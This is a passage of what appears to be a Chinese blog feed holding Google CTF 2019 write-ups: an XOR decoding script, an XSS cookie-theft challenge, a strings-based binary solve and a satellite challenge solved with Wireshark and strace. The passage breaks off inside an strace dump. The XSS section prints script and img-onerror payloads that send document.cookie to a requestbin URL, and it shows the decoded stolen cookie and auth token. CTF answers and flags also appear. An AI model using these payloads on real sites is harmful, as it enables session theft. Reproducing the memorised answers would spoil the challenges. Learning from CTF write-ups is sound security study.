punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    k1 <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>part2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ans <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>part2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> primes<span class="token punctuation">[</span>k2<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    k2 <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>part3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ans <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>part3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> primes<span class="token punctuation">[</span>k3<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    k3 <span class="token operator">+=</span> <span class="token number">1</span></code></pre><ul><li>解出完整网址</li></ul><pre class="language-sh" data-language="sh"><code class="language-sh">╭─r10@GSCR10 &#x2F;mnt&#x2F;c&#x2F;Users&#x2F;R10&#x2F;Desktop&#x2F;google ctf&#x2F;ctf&#x2F;06_FriendSpaceBookPlusAllAccessRedPremium.com╰─➤  python3 test.pyhttp:&#x2F;&#x2F;emoji-t0anaxnr3nacpt4na.web.ctfcompetition.com&#x2F;humans_and_cauliflowers_network&#x2F;</code></pre><ul><li><p>此页面得flag:<br><a href="http://emoji-t0anaxnr3nacpt4na.web.ctfcompetition.com/humans_and_cauliflowers_network/amber.html">http://emoji-t0anaxnr3nacpt4na.web.ctfcompetition.com/humans_and_cauliflowers_network/amber.html</a></p></li><li><p>==<strong>flag:CTF{Peace_from_Cauli!}</strong>==</p></li></ul><h2 id="08-Cookie-World-Order-web"><a href="#08-Cookie-World-Order-web" class="headerlink" title="08 Cookie World Order(web)"></a>08 Cookie World Order(web)</h2><ul><li><a href="https://cwo-xss.web.ctfcompetition.com/">https://cwo-xss.web.ctfcompetition.com/</a> 有一聊天对话框，admin在线，使用xss攻击获取cookie</li><li>尝试注入，提示HACKER ALERT!，说明网站设置了部分语法限制</li></ul><pre class="language-jsp" data-language="jsp"><code class="language-jsp">&lt;script&gt;location.href&#x3D;&#39;http:&#x2F;&#x2F;requestbin.net&#x2F;r&#x2F;14bfl601?test&#x3D;&#39;+document.cookie;&lt;&#x2F;script&gt;</code></pre><ul><li>尝试利用上传img onerror进行注入，绕过了alert(参见<a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a>)</li></ul><pre class="language-jsp" data-language="jsp"><code class="language-jsp">&lt;img src&#x3D;x onerror&#x3D;&quot;image &#x3D; new Image(); image.src&#x3D;&#39;http:&#x2F;&#x2F;requestbin.net&#x2F;r&#x2F;14bfl601?test&#x3D;&#39;+btoa(document.cookie);&quot;&gt;</code></pre><ul><li>get request</li></ul><pre class="language-txt" data-language="txt"><code class="language-txt">test: ZmxhZz1DVEZ7M21icjRjM190aGVfYzAwazFlX3cwcjFkX29yZDNyfTsgYXV0aD1UVXRiOVBQQTljWWtmY1ZRV1l6eHk0WGJ0eUwzVk5Leg&#x3D;&#x3D;</code></pre><ul><li>base64进行解码</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash">╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/06_FriendSpaceBookPlusAllAccessRedPremium.com╰─➤  <span class="token builtin class-name">echo</span> <span class="token string">'ZmxhZz1DVEZ7M21icjRjM190aGVfYzAwazFlX3cwcjFkX29yZDNyfTsgYXV0aD1UVXRiOVBQQTljWWtmY1ZRV1l6eHk0WGJ0eUwzVk5Leg=='</span> <span class="token operator">|</span> base64 -d<span class="token assign-left variable">flag</span><span class="token operator">=</span>CTF<span class="token punctuation">&#123;</span>3mbr4c3_the_c00k1e_w0r1d_ord3r<span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token assign-left variable">auth</span><span class="token operator">=</span>TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz</code></pre><ul><li>==<strong>flag:CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}</strong>==</li></ul>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>goolge ctf 2019 stage1 writeup_part_1</title>
    <link href="/2019/10/02/google_ctf_2019_stage1_writeup_1/"/>
    <url>/2019/10/02/google_ctf_2019_stage1_writeup_1/</url>
    
    <content type="html"><![CDATA[<h2 id="01-Enter-Space-Time-Coordinates-misc"><a href="#01-Enter-Space-Time-Coordinates-misc" class="headerlink" title="01 Enter Space-Time Coordinates(misc)"></a>01 Enter Space-Time Coordinates(misc)</h2><ul><li>下载zip压缩包解压，得到log.txt and rand2，进行查看</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash">➜ attachment <span class="token function">cat</span> log.txt<span class="token number">0</span>: AC+79 <span class="token number">3888</span><span class="token punctuation">&#123;</span>6652492084280_198129318435598<span class="token punctuation">&#125;</span><span class="token number">1</span>: Pliamas Sos<span class="token punctuation">&#123;</span>276116074108949_243544040631356<span class="token punctuation">&#125;</span><span class="token number">2</span>: Ophiuchus<span class="token punctuation">&#123;</span>11230026071572_273089684340955<span class="token punctuation">&#125;</span><span class="token number">3</span>: Pax Memor -ne4456 Hi Pro<span class="token punctuation">&#123;</span>21455190336714_219250247519817<span class="token punctuation">&#125;</span><span class="token number">4</span>: Camion Gyrin<span class="token punctuation">&#123;</span>235962764372832_269519420054142<span class="token punctuation">&#125;</span>➜ attachment <span class="token function">file</span> rand2rand2: ELF <span class="token number">64</span>-bit LSB shared object, x86-64, version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, dynamically linked, interpreter /lib64/l, <span class="token keyword">for</span> GNU/Linux <span class="token number">3.2</span>.0, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>0208fc60863053462fb733436cef1ed23cb6c78f, not stripped</code></pre><ul><li>执行rand2</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash">➜ attachment ./rand2Travel coordinator<span class="token number">0</span>: AC+79 <span class="token number">3888</span> - <span class="token number">95603467253307</span>, <span class="token number">47507421386467</span><span class="token number">1</span>: Pliamas Sos - <span class="token number">192115414361300</span>, <span class="token number">250197841279970</span><span class="token number">2</span>: Ophiuchus - <span class="token number">51512207753664</span>, <span class="token number">34661227854198</span><span class="token number">3</span>: Pax Memor -ne4456 Hi Pro - <span class="token number">235082830098621</span>, <span class="token number">202860065631117</span><span class="token number">4</span>: Camion Gyrin - <span class="token number">66299664563594</span>, <span class="token number">223065406793793</span> <span class="token number">5</span>: CTF - <span class="token operator">&lt;</span>REDACTED<span class="token operator">></span>Enter your destination's x coordinate:<span class="token operator">>></span><span class="token operator">></span></code></pre><ul><li>看到 CTF - REDACTED，log里面也没有坐标信息，尝试利用strings命令查看源码并搜索CTF</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash">➜ attachment strings ./rand2 <span class="token operator">|</span> <span class="token function">grep</span> CTFArrived at the flag. Congrats, your flag is: CTF<span class="token punctuation">&#123;</span>welcome_to_googlectf<span class="token punctuation">&#125;</span></code></pre><ul><li>==<strong>flag：CTF{welcome_to_googlectf}</strong>==</li></ul><h2 id="02-Satellite-networking"><a href="#02-Satellite-networking" class="headerlink" title="02 Satellite(networking)"></a>02 Satellite(networking)</h2><ul><li>下载压缩包解压得到：init_sat、readme.pdf</li><li>查看redeme.pdf,获取图片中“osmium”</li><li>查看init_sat文件类型</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash">➜ 02_Satellite <span class="token function">file</span> init_satinit_sat: ELF <span class="token number">64</span>-bit LSB executable, x86-64, version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, dynamically linked, interpreter /lib64/l, not stripped</code></pre><ul><li>执行init_sat,并输入“osmium”,按照指示得到</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash">➜ 02_Satellite ./init_satHello Operator. Ready to connect to a satellite?Enter the name of the satellite to connect to or <span class="token string">'exit'</span> to quitosimumUnrecognized satellite: osimumEnter the name of the satellite to connect to or <span class="token string">'exit'</span> to quitosmiumEstablishing secure connection to osmium satellite<span class="token punctuation">..</span>.Welcome. Enter <span class="token punctuation">(</span>a<span class="token punctuation">)</span> to display config data, <span class="token punctuation">(</span>b<span class="token punctuation">)</span> to erase all data or <span class="token punctuation">(</span>c<span class="token punctuation">)</span> to disconnectaUsername: brewtoot password: ********************       <span class="token number">166.00</span> IS-19 <span class="token number">2019</span>/05/09 00:00:00Swath 640km     Revisit capacity twice daily, anywhere Resolution panchromatic: 30cm multispectral: <span class="token number">1</span>.2m        Daily acquisition capacity: <span class="token number">220</span>,000km²  Remaining config data written to: https://docs.google.com/document/d/14eYPluD_pi3824GAFanS29tWdTcKxP_XUxx7e303-3E</code></pre><ul><li>可以察觉password：**<strong><strong>**</strong></strong>，有可能是flag。最后给的网址也许同样有线索</li><li>打开网址得到一字符串，观察可是应为base64加密</li></ul><pre class="language-txt" data-language="txt"><code class="language-txt">VXNlcm5hbWU6IHdpcmVzaGFyay1yb2NrcwpQYXNzd29yZDogc3RhcnQtc25pZmZpbmchCg&#x3D;&#x3D;</code></pre><ul><li>对字符串进行解码。并没有得到flag</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash">➜ 02_Satellite <span class="token builtin class-name">echo</span> <span class="token string">'VXNlcm5hbWU6IHdpcmVzaGFyay1yb2NrcwpQYXNzd29yZDogc3RhcnQtc25pZmZpbmchCg=='</span><span class="token operator">|</span> base64 -dUsername: wireshark-rocksPassword: start-sniffing<span class="token operator">!</span></code></pre><ul><li>方法一：根据提示，利用wireshark可以截获password明文</li></ul><pre class="language-txt" data-language="txt"><code class="language-txt">0000   00 0c 29 e9 77 9f 00 50 56 fd 49 f6 08 00 45 00   ..)éw..PVýIö..E.0010   01 93 02 05 00 00 80 06 9e cc 22 4c 65 1d c0 a8   .........Ì&quot;Le.À¨0020   50 82 05 39 e5 9e 28 e0 1a 57 cb 95 5d b1 50 18   P..9å.(à.WË.]±P.0030   fa f0 3a 91 00 00 55 73 65 72 6e 61 6d 65 3a 20   úð:...Username: 0040   62 72 65 77 74 6f 6f 74 20 70 61 73 73 77 6f 72   brewtoot passwor0050   64 3a 20 43 54 46 7b 34 65 66 63 63 37 32 30 39   d: CTF&#123;4efcc72090060   30 61 66 32 38 66 64 33 33 61 32 31 31 38 39 38   0af28fd33a2118980070   35 35 34 31 66 39 32 65 37 39 33 34 37 37 66 7d   5541f92e793477f&#125;0080   09 31 36 36 2e 30 30 20 49 53 2d 31 39 20 32 30   .166.00 IS-19 200090   31 39 2f 30 35 2f 30 39 20 30 30 3a 30 30 3a 30   19&#x2F;05&#x2F;09 00:00:000a0   30 09 53 77 61 74 68 20 36 34 30 6b 6d 09 52 65   0.Swath 640km.Re00b0   76 69 73 69 74 20 63 61 70 61 63 69 74 79 20 74   visit capacity t00c0   77 69 63 65 20 64 61 69 6c 79 2c 20 61 6e 79 77   wice daily, anyw00d0   68 65 72 65 20 52 65 73 6f 6c 75 74 69 6f 6e 20   here Resolution 00e0   70 61 6e 63 68 72 6f 6d 61 74 69 63 3a 20 33 30   panchromatic: 3000f0   63 6d 20 6d 75 6c 74 69 73 70 65 63 74 72 61 6c   cm multispectral0100   3a 20 31 2e 32 6d 09 44 61 69 6c 79 20 61 63 71   : 1.2m.Daily acq0110   75 69 73 69 74 69 6f 6e 20 63 61 70 61 63 69 74   uisition capacit0120   79 3a 20 32 32 30 2c 30 30 30 6b 6d c2 b2 09 52   y: 220,000kmÂ².R0130   65 6d 61 69 6e 69 6e 67 20 63 6f 6e 66 69 67 20   emaining config0140   64 61 74 61 20 77 72 69 74 74 65 6e 20 74 6f 3a   data written to:0150   20 68 74 74 70 73 3a 2f 2f 64 6f 63 73 2e 67 6f    https:&#x2F;&#x2F;docs.go0160   6f 67 6c 65 2e 63 6f 6d 2f 64 6f 63 75 6d 65 6e   ogle.com&#x2F;documen0170   74 2f 64 2f 31 34 65 59 50 6c 75 44 5f 70 69 33   t&#x2F;d&#x2F;14eYPluD_pi30180   38 32 34 47 41 46 61 6e 53 32 39 74 57 64 54 63   824GAFanS29tWdTc0190   4b 78 50 5f 58 55 78 78 37 65 33 30 33 2d 33 45   KxP_XUxx7e303-3E01a0   0a                                                .</code></pre><ul><li>方法二：思路转向password的明文。直接通过文本工具打开init_sat源码并不能查看到flag信息。尝试通过strace进行调试。</li><li>f 显示产生的子进程</li><li>s 需要显示的字符串长度</li><li>e 定位的参数，recv\read\write …</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash">➜ 02_Satellite <span class="token function">strace</span> -f -s <span class="token number">12345</span> -e <span class="token assign-left variable">trace</span><span class="token operator">=</span>recv,read ./init_satread<span class="token punctuation">(</span><span class="token number">3</span>, <span class="token string">"<span class="token entity" title="\177">\177</span>ELF<span class="token entity" title="\2">\2</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\3">\3</span><span class="token entity" title="\0">\0</span>><span class="token entity" title="\0">\0</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\000">\000</span>0b<span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>@<span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>P,<span class="token entity" title="\2">\2</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>@<span class="token entity" title="\000">\000</span>8<span class="token entity" title="\0">\0</span><span class="token entity" title="\t">\t</span><span class="token entity" title="\0">\0</span>@<span class="token entity" title="\0">\0</span>(<span class="token entity" title="\0">\0</span>'<span class="token entity" title="\0">\0</span><span class="token entity" title="\6">\6</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\4">\4</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>@<span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>@<span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>@<span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\370">\370</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\370">\370</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\10">\10</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\3">\3</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\4">\4</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>PM<span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>PM<span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>PM<span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\34">\34</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\34">\34</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\20">\20</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\5">\5</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\20">\20</span><span class="token entity" title="\223">\223</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\20">\20</span><span class="token entity" title="\223">\223</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span> <span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\6">\6</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\240">\240</span><span class="token entity" title="\233">\233</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\240">\240</span><span class="token entity" title="\233">\233</span>!<span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\240">\240</span><span class="token entity" title="\233">\233</span>!<span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>P<span class="token entity" title="\7">\7</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\340">\340</span>H<span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span> <span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\2">\2</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\6">\6</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>h<span class="token entity" title="\235">\235</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>h<span class="token entity" title="\235">\235</span>!<span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>h<span class="token entity" title="\235">\235</span>!<span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\000">\000</span>0<span class="token entity" title="\2">\2</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\000">\000</span>0<span class="token entity" title="\2">\2</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\10">\10</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\4">\4</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\4">\4</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\000">\000</span>8<span class="token entity" title="\2">\2</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\000">\000</span>8<span class="token entity" title="\2">\2</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\000">\000</span>8<span class="token entity" title="\2">\2</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>D<span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>D<span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\4">\4</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>P<span class="token entity" title="\345">\345</span>td<span class="token entity" title="\4">\4</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>pM<span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>pM<span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>pM<span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\344">\344</span><span class="token entity" title="\10">\10</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\344">\344</span><span class="token entity" title="\10">\10</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\4">\4</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>Q<span class="token entity" title="\345">\345</span>td<span class="token entity" title="\6">\6</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\20">\20</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>R<span class="token entity" title="\345">\345</span>td<span class="token entity" title="\4">\4</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\240">\240</span><span 